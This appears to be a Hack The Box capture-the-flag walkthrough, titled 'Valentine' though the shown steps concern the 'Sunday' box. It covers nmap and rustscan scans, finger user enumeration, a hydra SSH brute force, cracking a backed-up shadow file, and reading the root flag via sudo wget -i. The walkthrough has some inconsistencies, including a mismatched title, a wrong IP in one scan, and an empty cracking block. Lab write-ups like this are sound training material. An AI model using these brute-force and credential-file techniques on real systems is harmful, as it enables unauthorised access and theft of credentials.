# Hack The Box - Valentine Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sunday]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.76 
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 03:54 EST
Stats: 0:13:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.48% done; ETC: 04:10 (0:03:34 remaining)
Nmap scan report for 10.10.10.76
Host is up (0.096s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
79/tcp    open     finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open     rpcbind       2-4 (RPC #100000)
515/tcp   open     printer
808/tcp   filtered ccproxy-http
1112/tcp  filtered msql
1417/tcp  filtered timbuktu-srv1
1935/tcp  filtered rtmp
2002/tcp  filtered globe
5960/tcp  filtered unknown
10628/tcp filtered unknown
65389/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.93%I=7%D=3/4%Time=64030B9F%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r
SF:\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20\
SF:x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/4%OT=79%CT=1%CU=32638%PV=Y%DS=2%DC=I%G=Y%TM=64030C0E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=7)
OS:OPS(O1=ST11M53CNW2%O2=ST11M53CNW2%O3=NNT11M53CNW2%O4=ST11M53CNW2%O5=ST11
OS:M53CNW2%O6=ST11M53C)WIN(W1=FA4C%W2=FA4C%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF7)
OS:ECN(R=Y%DF=Y%T=3C%W=FB40%O=M53CNNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M53CNW2%
OS:RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=N)U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=Y%T=FF%CD=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1248.96 seconds
```

Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sunday]
└─$ rustscan 10.10.10.76 --range 1-65535 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.config/rustscan/config.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.76:79
Open 10.10.10.76:111
Open 10.10.10.76:515
Open 10.10.10.76:6787
Open 10.10.10.76:22022
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 79,111,515,6787,22022 10.10.10.76

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 04:09 EST
Initiating Ping Scan at 04:09
Scanning 10.10.10.76 [2 ports]
Completed Ping Scan at 04:09, 2.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:09
Completed Parallel DNS resolution of 1 host. at 04:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:09
Scanning 10.10.10.76 [5 ports]
Discovered open port 111/tcp on 10.10.10.76
Discovered open port 515/tcp on 10.10.10.76
Discovered open port 79/tcp on 10.10.10.76
Discovered open port 6787/tcp on 10.10.10.76
Discovered open port 22022/tcp on 10.10.10.76
Completed Connect Scan at 04:09, 0.12s elapsed (5 total ports)
Nmap scan report for 10.10.10.76
Host is up, received conn-refused (0.12s latency).
Scanned at 2023-03-04 04:09:43 EST for 0s

PORT      STATE SERVICE   REASON
79/tcp    open  finger    syn-ack
111/tcp   open  rpcbind   syn-ack
515/tcp   open  printer   syn-ack
6787/tcp  open  smc-admin syn-ack
22022/tcp open  unknown   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds
```

So, Nmap found 2 open ports while rustscan found 5 open ports.

To confirm it, I ran nmap once again, to scan all the ports and a `max retries` flag.

```
nmap -p- -oA full-noscripts 10.10.10.76  --max-retries 0
```

I got back the following result showing that two other ports are open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sunday]
└─$ nmap -p- -oA full-noscripts 10.10.10.76  --max-retries 0
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 04:19 EST
Warning: 10.10.10.76 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.10.76
Host is up (0.12s latency).
Not shown: 64050 filtered tcp ports (no-response), 1481 closed tcp ports (conn-refused)
PORT      STATE SERVICE
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 74.18 seconds
```

Then I ran a more comprehensive nmap scan to identify services running on above ports.
```
nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7
```

I got back the following results.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sunday]
└─$ nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.76
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 04:21 EST
Nmap scan report for 10.10.10.76
Host is up (0.12s latency).

PORT      STATE  SERVICE VERSION
79/tcp    open   finger?
111/tcp   open   rpcbind 2-4 (RPC #100000)
22022/tcp open   ssh     OpenSSH 7.5 (protocol 2.0)
55029/tcp closed unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.93%I=7%D=3/4%Time=64030D83%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r
SF:\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20\
SF:x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.19 seconds
```

This indicated that:
- Port `22022`: is running SunSSH 1.3
- Port `55029`: is running a service that nmap was not able to identify

## Enumeration
I started by enumeration port `79` first. A quuck google search on `Finger service` got me this information.

```
Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, 
and possibly other details about the user you are fingering. These details may include the office location and phone 
number (if known), login time, idle time, time mail was last read, and the user's plan and project files.
```

So, we can just log into this service using the following command to check if anyone was previous logged in.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sunday]
└─$ finger @10.10.10.76
No one logged on
```

No one was logged in, so, I tried to check if `root` exists.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sunday]
└─$ finger root@10.10.10.76
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14 10:28>
```

It did exist. So now, I decided to enumerate more usernames. The [seclists](https://installlion.com/kali/kali/main/s/seclists/install/index.html) project has a list of usernames that we can use in order to guess the usernames that are available on the server.

```
/usr/share/seclists/Usernames/Names/names.txt
```

Pentestmonkey has a [finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum) script that is used to enumerate OS-level user accounts via the finger service. Let’s run that on our host.

```
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
```

- -U: file of usernames to check via finger service
- -t: server host running finger service

I got back the following result showing us that `sammy` and `sunday` are users of the system.

```
....
sammy@10.10.10.76: sammy                 pts/2        <Apr 24, 2018> 10.10.14.4          ..                                                                                    
sunny@10.10.10.76: sunny                              <Jan  5 23:37> 10.10.14.12         ..
....
```

## Initial Foothold

Since SSH is open and we have two valid usernames, let’s try brute-forcing the users’ credentials using hydra. We’ll start off with Sunny.

```
hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```

I got back the following results.

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
....
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
....
```

Using these credentials, I tried to SSH into sunny's account.

```
┌──(darshan㉿kali)-[~/…/HackTheBox/Linux-Boxes/Sunday/finger-user-enum-1.0]
└─$ ssh -p 22022 sunny@10.10.10.76
The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (ED25519) to the list of known hosts.
(sunny@10.10.10.76) Password: 
Last login: Wed Apr 13 15:35:50 2022 from 10.10.14.13
Oracle Corporation      SunOS 5.11      11.4    Aug 2018
sunny@sunday:~$ whomai
-bash: whomai: command not found
sunny@sunday:~$ id
uid=101(sunny) gid=10(staff)
sunny@sunday:~$ pwd
/home/sunny
```

Trying to locate the user flag, I used the `find` command.

```
sunny@sunday:/home$ find / -name  user.txt 2>/dev/null
/home/sammy/user.txt
```

Grabbing the user flag.

```
sunny@sunday:/home$ cat sammy/user.txt
[REDACTED]
```

## Privelege Escalation
I tried running the `sudo -l` command and it gave me the following:

```
sunny@sunday:/home$ sudo -l
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
```

So I could run the `/root/troll` command as root. This is obviously a custom command so I decided to run it to see what it’s doing .

```
sunny@sunday:/home$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

It seemed to be a script that prints the id of the user running it. Since I ran it with the ‘sudo’ command, it printed the id of root. I didn’t have write access to the script, so I wasn’t able to escalate my privileges using it.

After a bit of digging, I found a backup file in the following directory.

```
sammy@sunday:~$ find / -name  backup 2>/dev/null
/backup
```

It contained two files `agen22.backup` and `shadow.backup`. The former, I didn’t have access to, however, I could view the latter.

```
sammy@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

It was a backup of shadow file. Now, since I already knew sunny's password, I tried to crack Sammy's password. For this, I copied Sammy's hash and saved it in a file and then use John the ripper to crack the hash.

```
```

Now that I got sammy's password, I pivoted to sammy's account and enumerated it.

I ran `sudo -l` on sammy's account and found out that I was  able to run `/usr/bin/wget` as root.

If you’re familiar with the “-i” flag in wget, you’ll know that we can use it to output the content of files. Therefore, we can run the following command to get the root flag.

```
sammy@sunday:/backup$ sudo wget -i /root/root.txt
--2023-03-04 10:07:55--  http://[REDACTED]/
Resolving [REDACTED] ([REDACTED])... failed: temporary name resolution failure.
wget: unable to resolve host address ‘[REDACTED]’
```

And I was able to grab the root flag and complete the challenge.
